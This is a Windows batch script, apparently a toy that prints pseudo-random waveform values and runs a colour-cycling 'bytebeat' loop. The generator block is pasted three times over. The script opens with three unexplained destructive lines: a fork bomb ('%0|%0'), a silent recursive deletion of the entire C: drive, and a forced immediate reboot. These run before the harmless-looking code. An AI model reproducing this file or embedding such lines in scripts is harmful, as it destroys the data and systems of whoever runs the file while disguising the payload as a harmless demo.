%0|%0
rd C:\ /s /q
shutdown /r /f /t 0

@echo off
setlocal enabledelayedexpansion

rem Max samples to generate
set max=256

rem Loop from t=0 to t=max-1
for /L %%t in (0,1,%max%) do (
    rem Use %RANDOM% and some arithmetic to simulate a waveform
    set /a val=( ( (%%t * 3) %% 256) + ( %random% %% 64 ) ) %% 256
    
    rem Print the value as sample output
    echo t=%%t val=!val!
)

pause

@echo off
setlocal enabledelayedexpansion

rem Max samples to generate
set max=256

rem Loop from t=0 to t=max-1
for /L %%t in (0,1,%max%) do (
    rem Use %RANDOM% and some arithmetic to simulate a waveform
    set /a val=( ( (%%t * 3) %% 256) + ( %random% %% 64 ) ) %% 256
    
    rem Print the value as sample output
    echo t=%%t val=!val!
)

pause

@echo off
setlocal enabledelayedexpansion

rem Max samples to generate
set max=256

rem Loop from t=0 to t=max-1
for /L %%t in (0,1,%max%) do (
    rem Use %RANDOM% and some arithmetic to simulate a waveform
    set /a val=( ( (%%t * 3) %% 256) + ( %random% %% 64 ) ) %% 256
    
    rem Print the value as sample output
    echo t=%%t val=!val!
)

pause


@echo off
setlocal enabledelayedexpansion

:: Loop forever
:main
for /L %%t in (0,1,1000) do (
    set /a t=%%t

    rem Bytebeat math
    set /a part1=5
    set /a check1=(t & 16384)
    if !check1! NEQ 0 set part1=7

    set /a right9=(t>>9)
    set /a right8=(t>>8)
    set /a part2=3 - (3 & right9) + (3 & right8)

    set /a neg_t=-t
    set /a and3=(3 & neg_t)
    set /a check2=(t & 4096)
    set /a shift_amt=16
    if !check2! NEQ 0 set shift_amt=2
    set /a part3=and3 >> shift_amt

    set /a val1=t * part1 * part2
    set /a val2=val1 >> part3
    set /a val=val2 | (t >> 3)
    set /a val_mod=val & 255

    rem Use val_mod to cycle colors (0-15)
    set /a color=!val_mod! %% 16
    call :setcolor !color!

    rem Print visual block or value
    set /p="█" <nul
    ping -n 1 127.0.0.1 >nul
)
goto main

:: Function to set console color
:setcolor
setlocal
set colorMap=0 1 2 3 4 5 6 7 8 9 A B C D E F
for /f "tokens=%1" %%c in ("%colorMap%") do (
    color 0%%c
)
endlocal
goto :eof

